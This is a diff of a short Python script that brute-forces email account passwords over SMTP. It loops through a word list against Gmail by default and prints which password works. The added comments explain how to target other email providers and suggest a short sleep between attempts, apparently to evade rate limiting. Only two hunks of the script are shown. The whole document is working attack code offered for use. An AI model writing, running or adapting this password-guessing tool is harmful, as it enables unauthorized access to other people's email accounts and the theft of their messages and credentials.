@@ -1,5 +1,5 @@
 from smtplib import SMTP
-server = SMTP('smtp.gmail.com',587)
+server = SMTP('smtp.gmail.com',587) #change this according to email provider. format: ('server',port)
 server.ehlo()
 server.starttls()
 
@@ -13,4 +13,4 @@ for password in wordList:
         print(" + Password found ---> ", password)
     except smtplib.SMTPAuthenticationError:
         print(" - Password incorrect ---> ", password)
-        
+        #you may add a 'time.sleep()' on this line. 0.1 seconds or so should be enough.
